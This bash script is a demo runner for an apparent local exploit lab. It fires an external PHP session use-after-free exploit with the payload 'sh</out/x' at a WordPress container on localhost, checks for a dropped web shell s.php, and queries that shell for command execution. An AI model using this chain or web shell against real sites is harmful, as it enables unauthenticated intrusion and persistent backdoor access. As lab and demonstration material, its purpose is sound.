#!/usr/bin/env bash
# Demo runner. ./demo.sh | ./demo.sh --reset
#
# Stages its own payload first, so a normal run never depends on reset.sh
# having been called in this shell session. ./demo.sh --reset additionally
# recreates the containers and wipes /tmp artifacts for a clean slate.
#
# Ground truth is checked on the target filesystem, not from the exploit's
# own report.
#
# Scope: this demo stops at code execution as the web user. There is no
# privilege-escalation step.
cd "$(dirname "$0")" || exit 1
[ "${1:-}" = "--reset" ] && exec ./reset.sh

EXP="$HOME/php2shell-lab/php-session-uaf/sessionshell.py"
URL="http://127.0.0.1:8091/"
PROOF="/tmp/rce.txt"

# Re-stage every run: cheap, idempotent, and survives a manual `mkdir out`.
./stage.sh >/dev/null 2>&1 || { echo "[-] staging failed"; exit 1; }

# Clear last run's proof so a stale artifact can't look like a fresh success.
docker exec acme-wordpress rm -f "$PROOF" 2>/dev/null

echo "================================================================"
echo "  ACME Engineering Blog (WordPress) — unauthenticated RCE"
echo "================================================================"
echo
echo "[0] Target is a stock WordPress install. No upload form is used,"
echo "    no admin login, no plugin, no theme — just the homepage:"
curl -s "$URL" | grep -oiE '<title>[^<]*</title>' | sed 's/^/    /'
echo "    URL: $URL"
echo
echo "[1] Firing the exploit at the blog homepage..."
python3 "$EXP" -u "$URL" -c 'sh</out/x' 2>&1 | grep -E 'PROOF|EXPLOIT_FAILED' | sed 's/^/    /'
echo

echo "[2] Ground truth: did code execution happen?"
if docker exec acme-wordpress test -f /var/www/html/s.php 2>/dev/null; then
  echo "    /var/www/html/s.php exists — the payload was written by the"
  echo "    compromised worker, not by us:"
  docker exec acme-wordpress stat -c '    %n  %U:%G  %s bytes' /var/www/html/s.php
else
  echo "    NOT YET — run ./demo.sh --reset and retry"
  exit 1
fi
echo
echo "[3] Interactive shell dropped at /s.php:"
curl -s "$URL""s.php?whoami=1" | sed 's/^/    /'
echo
echo "    Open: $URL""s.php   (cd /etc, ls, cat ...)"
echo
echo "[*] Re-run freely: ./demo.sh   Clean slate: ./demo.sh --reset"
